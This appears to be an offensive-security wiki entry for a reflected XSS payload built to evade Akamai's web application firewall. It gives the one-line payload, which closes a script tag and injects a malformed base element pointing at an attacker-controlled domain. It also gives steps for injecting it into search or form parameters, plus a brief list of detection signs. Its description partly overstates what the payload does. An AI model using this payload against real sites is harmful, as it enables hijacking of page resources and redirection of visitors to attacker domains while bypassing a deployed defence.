---
id: 9e206f1a-ab2f-4baa-bce7-6cb2de3a8b8a
name: XSS-Payload-for-Akamai-WAF-Bypass
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:43.544631+00:00'
updated_at: '2023-04-10T20:21:47.489543+00:00'
platforms:
  - Web
tags:
  - xss
  - payload
  - waf-bypass
  - javascript
validated: true
---

# XSS-Payload-for-Akamai-WAF-Bypass

## Code

```javascript
?"></script><base%20c%3D=href%3Dhttps:\/$TARGET_SITE>
```

## Description

This JavaScript payload is designed to bypass Akamai WAF protections in XSS attacks. It closes an existing `<script>` tag prematurely with `?">` and injects a malformed `<base>` element to redirect or alter the page's base URL, evading signature-based detection. The payload exploits encoding and tag parsing differences between the WAF and browser renderer.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $TARGET_SITE | The target site or attacker-controlled domain for redirection | mysite.com |

## Usage

Inject this payload (URL-encoded) into vulnerable parameters like search queries or form fields in a web app behind Akamai WAF. For example, append to a URL: http://target.com/search?q=<encoded_payload>. When reflected and executed in the browser, it bypasses the WAF to run the script. Use in procedures like [[procedures/Akamai-WAF-Bypass-via-Common-XSS-Injection-Attack]] for testing reflected/stored XSS.

## Detection

- WAF logs showing encoded base/script tags or unusual href attributes in requests.
- Browser CSP violations or console errors from malformed base elements.
- Network monitoring for redirects to unexpected domains post-injection.
- Client-side: JavaScript execution logs or DOM inspection revealing injected base tag.

## Related

- [[procedures/Akamai-WAF-Bypass-via-Common-XSS-Injection-Attack]]
